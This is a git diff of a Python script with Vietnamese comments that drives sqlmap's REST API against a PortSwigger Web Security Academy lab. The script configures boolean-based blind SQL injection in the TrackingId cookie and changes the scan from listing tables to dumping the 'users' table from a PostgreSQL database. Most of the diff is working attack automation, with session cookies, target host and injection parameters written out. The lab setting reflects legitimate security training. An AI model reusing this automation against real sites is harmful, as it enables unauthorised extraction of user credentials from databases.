@@ -69,6 +69,8 @@ import sys
 from urllib.parse import urljoin, urlencode
 import urllib3
 
+from pprint import pprint
+
 # Tắt cảnh báo SSL không an toàn
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
@@ -82,16 +84,15 @@ API_PASS = "securepassword123"
 
 # ======================= [BẮT ĐẦU] PASTE CODE TỪ CURLCONVERTER VÀO ĐÂY =======================
 # (Thay thế các thông tin dưới đây bằng request thực tế của bạn)
-
 import requests
 
 cookies = {
-    'TrackingId': 'WxyBJEuPg4QS8ymG',
-    'session': '8QggNQddnM0ygUpjfmY8n2HUfVWMpUMC',
+    'TrackingId': 'sK8NynIjHU7LqoLn',
+    'session': 'wzZQdLlle3buV6G70KbvUEc2gUEFaYe9',
 }
 
 headers = {
-    'Host': '0ad400d60328635d82bd7432000a0094.web-security-academy.net',
+    'Host': '0ad500e303aa63928535037800280034.web-security-academy.net',
     'Sec-Ch-Ua': '"Google Chrome";v="149", "Chromium";v="149", "Not)A;Brand";v="24"',
     'Sec-Ch-Ua-Mobile': '?0',
     'Sec-Ch-Ua-Platform': '"Windows"',
@@ -102,17 +103,16 @@ headers = {
     'Sec-Fetch-Mode': 'navigate',
     'Sec-Fetch-User': '?1',
     'Sec-Fetch-Dest': 'document',
-    'Referer': 'https://0ad400d60328635d82bd7432000a0094.web-security-academy.net/filter?category=Pets',
+    'Referer': 'https://0ad500e303aa63928535037800280034.web-security-academy.net/',
     # 'Accept-Encoding': 'gzip, deflate, br',
     'Accept-Language': 'en-US,en;q=0.9',
     'Priority': 'u=0, i',
-    # 'Cookie': 'TrackingId=WxyBJEuPg4QS8ymG; session=8QggNQddnM0ygUpjfmY8n2HUfVWMpUMC',
+    # 'Cookie': 'TrackingId=sK8NynIjHU7LqoLn; session=wzZQdLlle3buV6G70KbvUEc2gUEFaYe9',
 }
 
 params = {
-    'category': 'Pets',
+    'category': 'Gifts',
 }
-
 
 referer = headers.get('Referer', '')
 url = urljoin(referer, '/filter')
@@ -193,22 +193,44 @@ def build_sqlmap_options(detected_dbms):
     headers_list = [f"{k}: {v}" for k, v in headers.items() if k.lower() not in ignored_headers]
     headers_str = "\n".join(headers_list)
 
+    # options = {
+    #     "url": full_url,
+    #     "cookie": cookie_str,
+    #     "headers": headers_str,
+    #     "batch": True,
+        
+    #     # --- BƯỚC KHAI THÁC MỤC TIÊU (DUMP DỮ LIỆU) ---
+    #     "getTables": True,               # Yêu cầu lấy danh sách bảng của Database hiện tại
+    #     # "commonTables": True,          # Hoặc bạn có thể dùng để brute-force bảng nếu DBMS là PostgreSQL/Oracle
+        
+    #     # --- ĐIỀU CHỈNH ĐỂ KHÔNG ĐOÁN DBMS VÀ KỸ THUẬT ---
+    #     "level": 2,                      # Bắt buộc vì lỗi nằm ở Cookie
+    #     "testParameter": "TrackingId",   # Chỉ quét đúng tham số này
+    #     "technique": "B",                     # Ép sqlmap CHỈ dùng kỹ thuật Boolean-based blind, bỏ qua 5 kỹ thuật khác
+    #     "threads": "10",
+    # }
+
     options = {
         "url": full_url,
         "cookie": cookie_str,
         "headers": headers_str,
         "batch": True,
-        
-        # --- BƯỚC KHAI THÁC MỤC TIÊU (DUMP DỮ LIỆU) ---
-        "getTables": True,               # Yêu cầu lấy danh sách bảng của Database hiện tại
-        # "commonTables": True,          # Hoặc bạn có thể dùng để brute-force bảng nếu DBMS là PostgreSQL/Oracle
-        
-        # --- ĐIỀU CHỈNH ĐỂ KHÔNG ĐOÁN DBMS VÀ KỸ THUẬT ---
-        "level": 2,                      # Bắt buộc vì lỗi nằm ở Cookie
-        "testParameter": "TrackingId",   # Chỉ quét đúng tham số này
-        "technique": "B",                     # Ép sqlmap CHỈ dùng kỹ thuật Boolean-based blind, bỏ qua 5 kỹ thuật khác
-        "threads": "5",
+
+        "testParameter": "TrackingId",  # Tương ứng cờ -p
+        "level": 2,  # Bắt buộc để quét Cookie
+        "threads": 10,
+        "string": "Welcome back!", ## --string=""
+        "technique": "B",
+
+        "dbms": "PostgreSQL",  # --dbms="" .Chỉ định thẳng hệ quản trị cơ sở dữ liệu
+        "db": "public",  # Tương ứng cờ -D (-D public)
+        "tbl": "users",  # Tương ứng cờ -T (-T users)
+        "dumpTable": True,  # Tương ứng cờ --dump khi đi kèm bảng cụ thể
+
+        # "disableLogging": True,  # Tương ứng cờ --no-logging
+        "outputDir": "%TEMP%\\sqlmap_temp",
     }
+
 
     # Nếu hàm tự viết của bạn tìm ra DBMS, truyền thẳng vào đây để sqlmap không quét đoán DBMS nữa
     if detected_dbms:
@@ -257,9 +279,13 @@ if __name__ == "__main__":
         scan_options = build_sqlmap_options(detected_dbms)
 
         # Khởi động quét
-        requests.post(f"{API_URL}/scan/{task_id}/start", json=scan_options, auth=auth_cred)
+        requests.post(f"{API_URL}/scan/{task_id}/start",
+                        json=scan_options,
+                        auth=auth_cred)
+        
+        
         print(f"[+] Đang yêu cầu SQLMap trích xuất cấu trúc dữ liệu...")
-
+        
         # 4. Theo dõi trạng thái và in kết quả thời gian thực
         last_log_index = 0  # Biến lưu vị trí log cuối cùng đã đọc
         
@@ -267,7 +293,7 @@ if __name__ == "__main__":
             # Lấy trạng thái quét
             status_data = requests.get(f"{API_URL}/scan/{task_id}/status", auth=auth_cred).json()
             status = status_data.get("status")
-            
+
             # Lấy toàn bộ log từ đầu đến hiện tại
             log_data = requests.get(f"{API_URL}/scan/{task_id}/log", auth=auth_cred).json()
             logs = log_data.get("log", [])
